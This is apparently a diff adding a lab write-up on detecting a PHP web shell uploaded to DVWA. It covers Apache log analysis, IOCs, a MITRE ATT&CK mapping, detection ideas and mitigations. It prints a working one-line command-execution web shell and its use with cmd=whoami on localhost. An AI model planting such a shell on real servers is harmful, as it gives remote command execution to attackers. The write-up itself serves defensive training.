@@ -1,0 +1,129 @@
+*Web Shell Upload Detection using DVWA and Apache Logs*
+*Project Overview*
+
+This project demonstrates how an unrestricted file upload vulnerability can allow an attacker to upload a PHP web shell to a vulnerable web application. After uploading the file, web server logs were analyzed from a SOC analyst's perspective to identify indicators of compromise (IOCs) and understand the attack sequence.
+
+*Objective*
+Understand unrestricted file upload vulnerabilities.
+Simulate a web shell upload in a controlled lab.
+Analyze Apache access logs.
+Identify suspicious activity.
+Document IOCs.
+Recommend mitigation and detection strategies.
+Lab Environment
+Component	Details
+Operating System	Kali Linux
+Web Server	Apache2
+PHP	PHP 8.1
+Database	MariaDB
+Vulnerable Application	DVWA
+Security Level	Low
+Tools Used
+DVWA
+Apache2
+MariaDB
+Firefox Browser
+Linux Terminal
+Apache Access Logs
+Attack Scenario
+
+*The vulnerable File Upload functionality in DVWA was used to upload a PHP web shell.*
+
+*Uploaded file:*
+
+<?php
+echo "<h2>DVWA Upload Test</h2>";
+
+if(isset($_GET['cmd'])){
+    system($_GET['cmd']);
+}
+?>
+
+The uploaded file was successfully stored inside:
+
+/DVWA/hackable/uploads/
+Attack Execution
+Step 1
+
+Uploaded:
+
+shell.php
+
+Result:
+
+Upload Successful
+Step 2
+
+Accessed:
+
+http://localhost/DVWA/hackable/uploads/shell.php
+
+Output:
+
+DVWA Upload Test
+Step 3
+
+Executed:
+
+http://localhost/DVWA/hackable/uploads/shell.php?cmd=whoami
+
+Output:
+
+www-data
+
+This demonstrated that commands supplied through the cmd parameter were executed by the web server process.
+
+Apache Log Analysis
+
+Observed log entries:
+
+127.0.0.1 - - [11/Jul/2026:18:50:33 +0530] "GET /DVWA/hackable/uploads/shell.php HTTP/1.1" 200
+
+127.0.0.1 - - [11/Jul/2026:18:50:48 +0530] "GET /DVWA/hackable/uploads/shell.php?cmd=whoami HTTP/1.1" 200
+Indicators of Compromise (IOCs)
+IOC	Observation
+Source IP	127.0.0.1 (lab environment)
+Uploaded file	shell.php
+Upload directory	/DVWA/hackable/uploads/
+Suspicious parameter	cmd=whoami
+HTTP Status	200 OK
+Web Server	Apache2
+MITRE ATT&CK Mapping
+Technique	ID
+Exploit Public-Facing Application	T1190
+Command and Scripting Interpreter (Unix Shell)	T1059.004
+
+In this lab, the uploaded PHP script accepted user input and executed operating system commands. This demonstrates how a vulnerable upload feature can be abused to run commands on the server.
+
+Detection Opportunities
+
+A SOC analyst could monitor for:
+
+Execution of .php files from upload directories.
+Requests containing suspicious query parameters such as cmd=.
+Repeated access to newly uploaded executable files.
+Unexpected server-side files appearing in upload folders.
+Mitigation Recommendations
+Allow only approved file extensions.
+Verify MIME types on the server side.
+Rename uploaded files.
+Store uploads outside the web root.
+Disable execution of scripts inside upload directories.
+Deploy a Web Application Firewall (WAF).
+Monitor upload directories for unauthorized executable files.
+Skills Demonstrated
+Linux Administration
+Apache Web Server
+PHP Web Applications
+Web Security Fundamentals
+Log Analysis
+IOC Identification
+Incident Investigation
+MITRE ATT&CK Mapping
+SOC Analyst Investigation
+Key Learning Outcomes
+Learned how unrestricted file upload vulnerabilities can be exploited in a controlled lab.
+Observed how an uploaded PHP file can be accessed and interacted with through HTTP requests.
+Practiced reviewing Apache access logs to identify suspicious activity.
+Extracted indicators of compromise from web server logs.
+Connected offensive behavior to defensive monitoring and investigation techniques relevant to SOC analysts.
